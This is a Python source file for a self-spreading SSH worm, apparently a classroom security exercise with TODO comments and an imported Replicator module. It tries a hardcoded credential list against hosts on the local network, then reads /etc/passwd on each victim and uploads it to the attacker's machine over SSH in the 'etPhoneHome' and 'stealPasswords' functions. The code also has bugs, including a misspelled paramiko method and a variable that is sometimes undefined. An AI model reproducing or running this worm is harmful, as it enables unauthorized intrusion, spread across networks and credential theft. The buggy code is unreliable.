import sys
import socket
import paramiko

from Replicator import Replicator

def main(argv):

	# The list of credentials to attempt
	credList = [
	('hello', 'world'),
	('hello1', 'world'),
	('root', '#Gig#'),
	('cpsc', 'cpsc'),
	]

	myReplicator = Replicator(credList)

	# If we are being run without a command line parameters,
	# then we assume we are executing on a victim system and
	# will act maliciously. This way, when you initially run the
	# worm on the origin system, you can simply give it some command
	# line parameters so the worm knows not to act maliciously
	# on attackers system. If you do not like this approach,
	# an alternative approach is to hardcode the origin system's
	# IP address and have the worm check the IP of the current
	# system against the hardcoded IP.
	if len(argv) < 1:

		# TODO: If we are running on the victim, check if
		# the victim was already infected. If so, terminate.
		# Otherwise, proceed with malice.
		if Replicator.isInfectedSystem():
			sys.exit(0)
	else:
		hostSystem = Replicator.getMyIp()

	# TODO: Get the IP of the current system
	currentIp = Replicator.getMyIp()

	# Get the hosts on the same network
	networkHosts = Replicator.getHostsOnTheSameNetwork()

	# TODO: Remove the IP of the current system
	# from the list of discovered systems (we
	# do not want to target ourselves!).
	networkHosts.remove(hostSystem)
	networkHosts.remove(currentIp)

	print("Found hosts: ", networkHosts)

	# Go through the network hosts
	for host in networkHosts:

		# Try to attack this host
		sshInfo =  myReplicator.attackSystem(host)

		print(sshInfo)

		# Did the attack succeed?
		if sshInfo:

			print("Trying to spread")

			# TODO: Check if the system was
			# already infected. This can be
			# done by checking whether the
			# remote system contains /tmp/infected.txt
			# file (which the worm will place there
			# when it first infects the system)
			# This can be done using code similar to
			# the code below:
			# try:
			#		remotepath = '/tmp/infected.txt'
			#		localpath = '/home/cpsc/'
			#	 # Copy the file from the specified
			#	 # remote path to the specified
			# 	 # local path. If the file does exist
			#	 # at the remote path, then get()
			# 	 # will throw IOError exception
			# 	 # (that is, we know the system is
			# 	 # not yet infected).
			#
			#        sftp.get(filepath, localpath)
			# except IOError:
			#       print "This system should be infected"
			#
			#
			# If the system was already infected proceed.
			# Otherwise, infect the system and terminate.
			# Infect that system
			stealPasswords(sshInfo, hostSystem)

			print ("Spreading complete")

def etPhoneHome(hostIP):
	'''
	Establish an SSH connection back to the attacker's system to upload
	the retrieved passwords
	:param hostIP: string
	:return: paramiko.SSHClient
	'''
	baseSystem = paramiko.SSHClient()
	baseSystem.set_mising_host_key_policy(paramiko.AutoAddPolicy())

	try:
		# Probably best to hide the attacker's credentials in case of a
		# counter-attack. For now just hardcode it into the worm.
		baseSystem.connect(hostIP, username='cpsc', password='cpsc')
	except:
		return None

	return baseSystem


def stealPasswords(sshClient, hostIP):
	'''
	Retrieve the password file on the victim's system and upload
	back to the attacker
	:param sshClient:
	:param hostIP:
	:return:
	'''
	hostSystem = etPhoneHome(hostIP)

	if hostSystem:
		f = open('/etc/passwd', 'r')
		allThePasswords = f.read()
		f.close()

		hostSystem.put('passwd_' + sshClient.ip, allThePasswords)
		# hostSystem.close()

if __name__ == "__main__":
	main(sys.argv[1:])
